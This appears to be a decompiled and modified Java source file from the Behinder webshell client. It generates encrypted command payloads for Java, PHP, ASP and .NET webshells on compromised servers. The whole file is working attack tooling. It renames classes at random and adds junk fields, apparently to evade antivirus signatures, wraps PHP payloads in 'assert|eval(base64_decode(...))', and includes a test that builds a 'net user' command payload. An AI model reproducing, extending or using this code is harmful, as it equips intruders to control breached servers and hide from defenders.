/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package net.rebeyond.behinder.core;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javassist.*;
import net.rebeyond.behinder.core.LegacyCryptor;
import net.rebeyond.behinder.dao.TransProtocolDao;
import net.rebeyond.behinder.entity.TransProtocol;
import net.rebeyond.behinder.utils.ReplacingInputStream;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;
import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;
import org.objectweb.asm.MethodVisitor;

import static com.unboundid.util.StaticUtils.randomString;

public class Params {
    private static Object t = new Object();
    public static Map<String, Map<String, CtClass>> payloadClassCache = new HashMap<String, Map<String, CtClass>>();
    public static Map<String, Map<String, Map<String, CtClass>>> legacyPayloadClassCache = new HashMap<String, Map<String, Map<String, CtClass>>>();

    public static byte[] getParamedClass(String clsName, Map<String, String> params) throws Exception {
        ClassReader classReader = new ClassReader(String.format("net.rebeyond.behinder.payload.java.%s", clsName));
        ClassWriter cw = new ClassWriter(1);
        String opcodeClassName = String.format("net.rebeyond.behinder.payload.java.%s", clsName).replace(".", "/");
        classReader.accept(new ClassAdapter(cw){

            @Override
            public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                if (params.containsKey(filedName)) {
                    String paramValue = (String)params.get(filedName);
                    return super.visitField(arg0, filedName, arg2, arg3, paramValue);
                }
                return super.visitField(arg0, filedName, arg2, arg3, arg4);
            }
        }, 0);
        byte[] result = cw.toByteArray();
        String oldClassName = String.format("net/rebeyond/behinder/payload/java/%s", clsName);
        if (!clsName.equals("LoadNativeLibrary")) {
            String newClassName = Utils.getRandomClassName(oldClassName);
            result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
            result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
        }
        result[7] = 49;
        return result;
    }

    private void fillJavaParams(MethodVisitor mv, String className, Map<String, String> params) {
        int blockSize = 65530;
        for (String paramName : params.keySet()) {
            String paramValue = params.get(paramName);
            if (paramValue.length() >= blockSize) continue;
        }
    }

    private static void setJavaParam(String className, MethodVisitor mv, String paramName, String[] paramValues) {
        mv.visitLdcInsn("");
        mv.visitFieldInsn(179, className, paramName, "Ljava/lang/String;");
        mv.visitTypeInsn(187, "java/lang/StringBuilder");
        mv.visitInsn(89);
        mv.visitMethodInsn(183, "java/lang/StringBuilder", "<init>", "()V");
        mv.visitFieldInsn(178, className, paramName, "Ljava/lang/String;");
        mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;");
        for (String paramValue : paramValues) {
            mv.visitLdcInsn(paramValue);
            mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;");
        }
        mv.visitMethodInsn(182, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;");
        mv.visitFieldInsn(179, className, paramName, "Ljava/lang/String;");
    }

    public static byte[] getParamedClass(byte[] classBytes, Map<String, String> params, String newClassName) throws Exception {
        ClassReader classReader = new ClassReader(classBytes);
        String clsName = classReader.getClassName();
        ClassWriter cw = new ClassWriter(1);
        classReader.accept(new ClassAdapter(cw){

            @Override
            public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
                if (name.equals("<clinit>")) {
                    int blockSize = 65530;
                    MethodVisitor mv = this.cv.visitMethod(access, name, desc, signature, exceptions);
                    for (String paramName : params.keySet()) {
                        String paramValue = (String)params.get(paramName);
                        String[] values2 = null;
                        values2 = paramValue.length() > blockSize ? Utils.splitString(paramValue, blockSize) : new String[]{paramValue};
                        Params.setJavaParam(clsName, mv, paramName, values2);
                    }
                    mv.visitEnd();
                    return mv;
                }
                return this.cv.visitMethod(access, name, desc, signature, exceptions);
            }
        }, 0);
        byte[] result = cw.toByteArray();
        String oldClassName = clsName;
        if (!clsName.equals("LoadNativeLibrary")) {
            result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
            result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
        }
        result[7] = 49;
        return result;
    }

    public static byte[] getParamedClass(String clsName, byte[] classBytes, Map<String, String> params) throws Exception {
        String opcodeClassName;
        String oldClassName = opcodeClassName = String.format("net/rebeyond/behinder/payload/java/%s", clsName);
        String newClassName = Utils.getRandomClassName(oldClassName);
        ClassReader classReader = new ClassReader(classBytes);
        ClassWriter cw = new ClassWriter(1);
        classReader.accept(new ClassAdapter(cw){

            @Override
            public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
                if (name.equals("<init>")) {
                    int blockSize = 65530;
                    MethodVisitor mv = this.cv.visitMethod(access, name, desc, signature, exceptions);
                    for (String paramName : params.keySet()) {
                        String paramValue = (String)params.get(paramName);
                        String[] values2 = null;
                        values2 = paramValue.length() > blockSize ? Utils.splitString(paramValue, blockSize) : new String[]{paramValue};
                        Params.setJavaParam(clsName, mv, paramName, values2);
                    }
                    mv.visitEnd();
                    return mv;
                }
                return this.cv.visitMethod(access, name, desc, signature, exceptions);
            }
        }, 0);
        byte[] result = cw.toByteArray();
        if (!clsName.equals("LoadNativeLibrary")) {
            oldClassName = clsName;
            result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
            result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
        } else {
            oldClassName = clsName;
            result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(opcodeClassName.length() + 2), 76}, opcodeClassName.getBytes()));
            result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)opcodeClassName.length()}, opcodeClassName.getBytes()));
        }
        result[7] = 49;
        return result;
    }

    public static byte[] getTransProtocoledClass(String className, TransProtocol transProtocol) throws Exception {
        String transProtocolName = transProtocol.getName();
        if (transProtocol.getId() < 0) {
            String key = ((LegacyCryptor)transProtocol.getCryptor()).getKey();
            if (legacyPayloadClassCache.containsKey(transProtocolName) && legacyPayloadClassCache.get(transProtocolName).containsKey(key) && legacyPayloadClassCache.get(transProtocolName).get(key).containsKey(className)) {
                return legacyPayloadClassCache.get(transProtocolName).get(key).get(className).toBytecode();
            }
            ClassPool cp = ClassPool.getDefault();
            CtClass PocCls = cp.getAndRename(String.format("net.rebeyond.behinder.payload.java.%s", className), Utils.getRandomString(10));

            //java
            // === 插入随机字段 ===
            String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random();
            int length = 150 + random.nextInt(1500);
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < length; i++) {
                sb.append(chars.charAt(random.nextInt(chars.length())));
            }
            String randomValue = sb.toString();
            String fieldName = "bohemian_" + random.nextInt(9999);
            String fieldSrc = "private static final String " + fieldName + " = \"" + randomValue + "\";";
            CtField junkField = CtField.make(fieldSrc, PocCls);
            PocCls.addField(junkField);
            //end

            CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);
            PocCls.removeMethod(PocCls.getDeclaredMethod("Encrypt"));
            PocCls.addMethod(encodeMethod);
            PocCls.setName(className);
            PocCls.detach();
            Map<String, CtClass> payloadClass = new HashMap<>();
            payloadClass.put(className, PocCls);
            Map<String, Map<String, CtClass>> keyPayloadMap = new HashMap<>();
            keyPayloadMap.put(key, payloadClass);
            legacyPayloadClassCache.put(transProtocolName, keyPayloadMap);
            return PocCls.toBytecode();
        }
        if (payloadClassCache.containsKey(transProtocolName) && payloadClassCache.get(transProtocolName).containsKey(className)) {
            return payloadClassCache.get(transProtocolName).get(className).toBytecode();
        }
        ClassPool cp = ClassPool.getDefault();
        CtClass PocCls = cp.getAndRename(String.format("net.rebeyond.behinder.payload.java.%s", className), Utils.getRandomString(10));
        CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);
        PocCls.removeMethod(PocCls.getDeclaredMethod("Encrypt"));
        PocCls.addMethod(encodeMethod);
        PocCls.setName(className);
        PocCls.detach();
        HashMap<String, CtClass> payloadClass = new HashMap<String, CtClass>();
        payloadClass.put(className, PocCls);
        payloadClassCache.put(transProtocolName, payloadClass);
        return PocCls.toBytecode();
    }

    public static byte[] getParamedClass(String className, Map<String, String> params, TransProtocol transProtocol) throws Exception {
        byte[] result = Params.getTransProtocoledClass(className, transProtocol);
        result = Params.getParamedClass(className, result, params);
        return result;

    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static byte[] getParamedClassByJavaassit(String className, byte[] classBody, Map<String, String> params) throws Exception {
        ClassPool cp = ClassPool.getDefault();
        // java xiugai

        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        Random r = new Random();
        int length = 150 + r.nextInt(151);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(r.nextInt(chars.length())));
        }
        String randomValue = sb.toString();
        String fieldName = "junk_" + r.nextInt(9999);

        // 构造字段代码并添加
        String fieldCode = "private static final String " + fieldName + " = \"" + randomValue + "\";";
        // 添加字段到类
        // 注意要先判断是否已经有同名字段（不然addField会报错），这里简单try-catch处理
        cp.insertClassPath(new ByteArrayClassPath(className, classBody));
        CtClass PocCls = cp.get(className);
        try {
            CtField oldField = PocCls.getDeclaredField(fieldName);
            PocCls.removeField(oldField);
        } catch (NotFoundException e) {
            // 没找到同名字段正常继续
        }
        CtField junkField = CtField.make(fieldCode, PocCls);
        PocCls.addField(junkField);

        //end

        for (String name : params.keySet()) {
            String value = params.get(name);
            int blockSize = 65500;
            if (value.length() > blockSize) {
                int count = value.length() / blockSize;
                String fieldSource = "public static String[] payloadBodyArr= new String[]{%s};";
                StringBuilder element = new StringBuilder();
                for (int i = 0; i < count; ++i) {
                    element.append("\"");
                    element.append(value, i * blockSize, i * blockSize + blockSize);
                    element.append("\",");
                }
                int remaining = value.length() % blockSize;
                if (remaining > 0) {
                    element.append("\"");
                    element.append(value, count * blockSize, count * blockSize + remaining);
                    element.append("\",");
                }
                element.setLength(element.length() - 1);
                fieldSource = String.format(fieldSource, element);
                Object object = t;
                synchronized (object) {
                    CtField ctField = PocCls.getDeclaredField("payloadBodyArr");
                    PocCls.removeField(ctField);
                    ctField = CtField.make(fieldSource, PocCls);
                    PocCls.addField(ctField);
                    continue;
                }
            }
            Object object = t;
            synchronized (object) {
                CtField ctField = PocCls.getDeclaredField(name);
                PocCls.removeField(ctField);
                PocCls.addField(ctField, CtField.Initializer.constant(value));
            }
        }
        PocCls.detach();
        return PocCls.toBytecode();
    }

    public static byte[] getParamedPhp(String clsName, Map<String, String> params, TransProtocol transProtocol) throws Exception {
        int b;
        String basePath = "net/rebeyond/behinder/payload/php/";
        String payloadPath = basePath + clsName + ".php";
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while (-1 != (b = bis.read())) {
            bos.write(b);
        }
        bis.close();
        String payloadBody = bos.toString();
        if (payloadBody.trim().startsWith("<?")) {
            payloadBody = payloadBody.replaceFirst("<\\?", "");
        }

        String CHAR_POOL = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        int length = random.nextInt(100) + 100; // 100 到 150
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            sb.append(CHAR_POOL.charAt(random.nextInt(CHAR_POOL.length())));
        }
        String randomStr = sb.toString();
        payloadBody = String.valueOf(payloadBody.replace("<<<ramdomstr100>>>", randomStr));
        code.append(payloadBody + "\n" + transProtocol.getEncode() + "\n");

        String paraList = "";
        //System.out.println("params:" + params);
        for (String paraName : Params.getPhpParams(code.toString())) {
            if (params.keySet().contains(paraName)) {
                String paraValue = params.get(paraName);
                paraValue = paraValue == null ? "" : paraValue;
                paraValue = Base64.getEncoder().encodeToString(paraValue.getBytes());
                code.append(String.format("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName));
                paraList = paraList + ",$" + paraName;
                continue;
            }
            code.append(String.format("$%s=\"%s\";", paraName, ""));
            paraList = paraList + ",$" + paraName;
        }
        paraList = paraList.replaceFirst(",", "");
        code.append("\r\nmain(" + paraList + ");");
        return code.toString().getBytes();
    }

    public static byte[] getParamedAssembly(String clsName, Map<String, String> params, TransProtocol transProtocol) throws Exception {
        return Params.getParamedAssembly(clsName, params);
    }

    private static byte[] getBlobLength(int length) {
        byte[] sizeBytes = new byte[]{};
        if (length <= 127) {
            sizeBytes = new byte[]{(byte)length};
        } else if (length > 127 && length <= 1023) {
            sizeBytes = Utils.shortToBytes(0x8000 | length);
        } else if (length >= 16384) {
            sizeBytes = Utils.intToBytes(0xC0000000 | length);
        }
        return sizeBytes;
    }

    public static void main(String[] args2) throws Exception {
        HashMap<String, String> p = new HashMap<String, String>();
        p.put("cmd", "net user");
        TransProtocolDao transProtocolDao = new TransProtocolDao();
        TransProtocol transProtocol = transProtocolDao.findTransProtocolById(3);
        byte[] data = Params.getParamedClass("net.rebeyond.behinder.payload.java.Cmd", p, transProtocol);
        FileOutputStream fos = new FileOutputStream("d:/cmd.class");
        fos.write(data);
        fos.flush();
        fos.close();
    }

    public static byte[] getParamedClassForPlugin(String payloadPath, Map<String, String> params) throws Exception {
        ClassReader classReader = new ClassReader(Utils.getFileData(payloadPath));
        ClassWriter cw = new ClassWriter(1);
        classReader.accept(new ClassAdapter(cw){

            @Override
            public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                if (params.containsKey(filedName)) {
                    String paramValue = (String)params.get(filedName);
                    return super.visitField(arg0, filedName, arg2, arg3, paramValue);
                }
                return super.visitField(arg0, filedName, arg2, arg3, arg4);
            }
        }, 0);
        byte[] result = cw.toByteArray();
        return result;
    }

    public static byte[] getParamedAssemblyForPlugin(String payloadPath, Map<String, String> params) throws Exception {
        byte[] result = Utils.getFileData(payloadPath);
        if (params.keySet().size() == 0) {
            return result;
        }
        String paramsStr = "";
        for (String paramName : params.keySet()) {
            String paramValue = Base64.getEncoder().encodeToString(params.get(paramName).getBytes("UTF-8"));
            paramsStr = paramsStr + paramName + ":" + paramValue + ",";
        }
        paramsStr = paramsStr.substring(0, paramsStr.length() - 1);
        String token = "~~~~~~" + paramsStr;
        return Utils.mergeBytes(result, token.getBytes());
    }

    public static byte[] getParamedPhpForPlugin(String payloadPath, Map<String, String> params) throws Exception {
        int b;
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getFileData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while (-1 != (b = bis.read())) {
            bos.write(b);
        }
        bis.close();
        String codeBody = bos.toString();
        if (codeBody.trim().startsWith("<?")) {
            codeBody = codeBody.replaceFirst("<\\?", "");
        }
        code.append(codeBody);
        String paramsString = String.format("\n;$params=json_decode(base64_decode('%s'),true);", Base64.getEncoder().encodeToString(JSONObject.valueToString(params).getBytes()));
        code.append(paramsString);
        return code.toString().getBytes();
    }

    public static byte[] getParamedAssembly(String clsName, Map<String, String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/csharp/";
        String payloadPath = basePath + clsName + ".dll";
        byte[] result = Utils.getResourceData(payloadPath);
        if (params.keySet().size() == 0) {
            return result;
        }
        String paramsStr = "";
        for (String paramName : params.keySet()) {
            String paramValue = Base64.getEncoder().encodeToString(params.get(paramName).getBytes("UTF-8"));
            paramsStr = paramsStr + paramName + ":" + paramValue + ",";
        }
        paramsStr = paramsStr.substring(0, paramsStr.length() - 1);
        String token = "~~~~~~" + paramsStr;
        return Utils.mergeBytes(result, token.getBytes());
    }

    public static byte[] getParamedAssemblyClassic(String clsName, Map<String, String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/csharp/";
        String payloadPath = basePath + clsName + ".dll";
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        for (String paraName : params.keySet()) {
            int b;
            String paraValue = params.get(paraName);
            StringBuilder searchStr = new StringBuilder();
            while (searchStr.length() < paraValue.length()) {
                searchStr.append(paraName);
            }
            byte[] search = Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0);
            byte[] replacement = Utils.ascii2unicode(paraValue, 1);
            ReplacingInputStream ris = new ReplacingInputStream(bis, search, replacement);
            while (-1 != (b = ((InputStream)ris).read())) {
                bos.write(b);
            }
            ((InputStream)ris).close();
        }
        return bos.toByteArray();
    }

    public static byte[] getParamedPhp(String clsName, Map<String, String> params) throws Exception {
        int b;
        String basePath = "net/rebeyond/behinder/payload/php/";
        String payloadPath = basePath + clsName + ".php";
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while (-1 != (b = bis.read())) {
            bos.write(b);
        }
        bis.close();
        code.append(bos.toString());
        String paraList = "";
        for (String paraName : Params.getPhpParams(code.toString())) {
            if (params.keySet().contains(paraName)) {
                String paraValue = params.get(paraName);
                paraValue = Base64.getEncoder().encodeToString(paraValue.getBytes());
                code.append(String.format("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName));
                paraList = paraList + ",$" + paraName;
                continue;
            }
            code.append(String.format("$%s=\"%s\";", paraName, ""));
            paraList = paraList + ",$" + paraName;
        }
        paraList = paraList.replaceFirst(",", "");
        code.append("\r\nmain(" + paraList + ");");
        return ("assert|eval(base64_decode('" + Base64.getEncoder().encodeToString(code.toString().getBytes()) + "'));").getBytes();
    }

    public static List<String> getPhpParams(String phpPayload) {
        ArrayList<String> paramList = new ArrayList<String>();
        Pattern mainPattern = Pattern.compile("main\\s*\\([^\\)]*\\)");
        Matcher mainMatch = mainPattern.matcher(phpPayload);
        if (mainMatch.find()) {
            String mainStr = mainMatch.group(0);
            Pattern paramPattern = Pattern.compile("\\$([a-zA-Z]*)");
            Matcher paramMatch = paramPattern.matcher(mainStr);
            while (paramMatch.find()) {
                paramList.add(paramMatch.group(1));
            }
        }
        return paramList;
    }

    public static byte[] getParamedAsp(String clsName, Map<String, String> params, TransProtocol transProtocol) throws Exception {
        int b;
        String basePath = "net/rebeyond/behinder/payload/asp/";
        String payloadPath = basePath + clsName + ".asp";
        StringBuilder codeBuilder = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while (-1 != (b = bis.read())) {
            bos.write(b);
        }
        bis.close();
        codeBuilder.append(bos.toString());
        String codeBody = codeBuilder.toString().replace("__Encrypt__", transProtocol.getEncode());
        String paraList = "";
        if (params != null && params.size() > 0) {
            paraList = paraList + "Array(";
            for (String paraName : params.keySet()) {
                String paraValue = params.get(paraName);
                String paraValueEncoded = "";
                for (int i = 0; i < paraValue.length(); ++i) {
                    paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
                }
                paraValueEncoded = paraValueEncoded.replaceFirst("&", "");
                paraList = paraList + "," + paraValueEncoded;
            }
            paraList = paraList + ")";
        }
        paraList = paraList.replaceFirst(",", "");
        codeBody = codeBody + "\r\nmain " + paraList + "";
        return codeBody.getBytes();
    }

    public static byte[] getParamedAsp(String clsName, Map<String, String> params) throws Exception {
        int b;
        String basePath = "net/rebeyond/behinder/payload/asp/";
        String payloadPath = basePath + clsName + ".asp";
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while (-1 != (b = bis.read())) {
            bos.write(b);
        }
        bis.close();
        code.append(bos.toString());
        String paraList = "";
        if (params.size() > 0) {
            paraList = paraList + "Array(";
            for (String paraName : params.keySet()) {
                String paraValue = params.get(paraName);
                String paraValueEncoded = "";
                for (int i = 0; i < paraValue.length(); ++i) {
                    paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
                }
                paraValueEncoded = paraValueEncoded.replaceFirst("&", "");
                paraList = paraList + "," + paraValueEncoded;
            }
            paraList = paraList + ")";
        }
        paraList = paraList.replaceFirst(",", "");
        code.append("\r\nmain " + paraList + "");
        return code.toString().getBytes();
    }

//    static /* synthetic */ void access$000(String x0, MethodVisitor x1, String x2, String[] x3) {
//        Params.setJavaParam(x0, x1, x2, x3);
//    }

    public static class t
    extends ClassLoader {
        public Class get(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
}

